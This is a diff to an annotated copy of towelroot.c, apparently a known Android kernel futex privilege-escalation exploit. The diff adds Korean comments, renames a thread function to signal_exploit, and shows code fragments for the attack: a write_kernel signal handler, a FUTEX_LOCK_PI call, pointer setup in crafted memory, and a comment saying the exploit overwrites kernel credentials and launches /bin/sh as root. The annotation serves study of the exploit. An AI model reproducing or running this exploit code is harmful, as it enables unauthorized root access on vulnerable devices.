@@ -28,10 +28,10 @@ towelroot.c
 		main()
 			init_exploit():
 				[th1]: accept_socket(): TCP 서버 소켓 하나 대기 시켜서 접속 받고 리턴함.
-				[th2]: search_goodnum(): 익스플로잇 설정 ...
+				[th2]: signal_exploit(): 익스플로잇 설정 ...
 					wake_actionthread 쓰레드를 많이 켬.
 					make_action(): 시그날 락하는 함수.
-						SIG_KILL 핸들러로(write_kernel())설정되어서, 함수로 커널 메모리에 접근해서 크리덴셜 등 갱신하고 setuid가 0일때
+						write_kernel() 함수로 커널 메모리에 접근해서 크리덴셜 등 갱신하고 setuid가 0일때
 						익스플로잇 실행 인자로 전달된 path의 파일 (/bin/sh) 실행.
 				[th3]: send_magicmsg(): 설정된(획득한) MAGIC, MAGIC_ALT 메시지(msg)를 전송.
 
@@ -400,17 +400,19 @@ void *make_action(void *arg) {
     int ret;
 
     prio = (int)arg;
-    last_tid = syscall(__NR_gettid);
+    last_tid = syscall(__NR_gettid); // last_tid = gettid 시스템 콜.
 
     pthread_mutex_lock(&is_thread_desched_lock);
     pthread_cond_signal(&is_thread_desched);
 
+    // write_kernel 시그날 핸들러 함수(커널 코드를 쓰는 해커 함수)를 설정.
     act.sa_handler = write_kernel;
     sigemptyset(&act.sa_mask);
     act.sa_flags = 0;
     act.sa_restorer = NULL;
     sigaction(12, &act, NULL);
 
+	// 프로세스 우선순위 설정.
     setpriority(PRIO_PROCESS, 0, prio);
 
     pthread_mutex_unlock(&is_thread_desched_lock);
@@ -421,9 +423,11 @@ void *make_action(void *arg) {
         ;
     }
 
-    ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+	// futex 락 걺.
+	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
     printf("futex dm: %d\n", ret);
 
+	// 무한 루프 대기.
     while (1) {
         sleep(10);
     }
@@ -614,9 +618,8 @@ static inline setup_exploit(unsigned long mem)
     *((unsigned long *)(mem + 0x2c)) = mem + 8;
 }
 
-// search_goodnum 함수 기능:
-
-void *search_goodnum(void *arg) {
+// signal_exploit:
+void *signal_exploit(void *arg) {
     int ret;
     char filename[256];
     FILE *fp;
@@ -675,7 +678,7 @@ void *search_goodnum(void *arg) {
     }
     else {
         fread(filebuf, 1, sizeof filebuf, fp);
-        pdest = strstr(filebuf, "voluntary_ctxt_switches");
+        pdest = strstr(filebuf, "voluntary_ctxt_switches"); // voluntary_ctxt_switches(프로세스가 얼마나 많은 컨텍스트 스위칭을 하는가 숫자 갑)
         pdest += 0x19; // voluntary_ctxt_switches +0x19 = pdest 변수 임.
         vcscnt = atoi(pdest);
         fclose(fp);
@@ -868,7 +871,7 @@ void *accept_socket(void *arg) {
 /*
 	call path:
 		[th1]: accept_socket()
-		[th2]: search_goodnum() 
+		[th2]: signal_exploit() 
 		[th3]: send_magicmsg()
 */
 void init_exploit() {
@@ -904,9 +907,9 @@ void init_exploit() {
         }
     }
 
-    // search_goodnum(), send_magicmsg() 두 함수를 쓰레드로 실행.
+    // signal_exploit(), send_magicmsg() 두 함수를 쓰레드로 실행.
     pthread_mutex_lock(&done_lock);
-    pthread_create(&th2, NULL, search_goodnum, NULL);
+    pthread_create(&th2, NULL, signal_exploit, NULL);
     pthread_create(&th3, NULL, send_magicmsg, NULL);
     pthread_cond_wait(&done, &done_lock);
 }
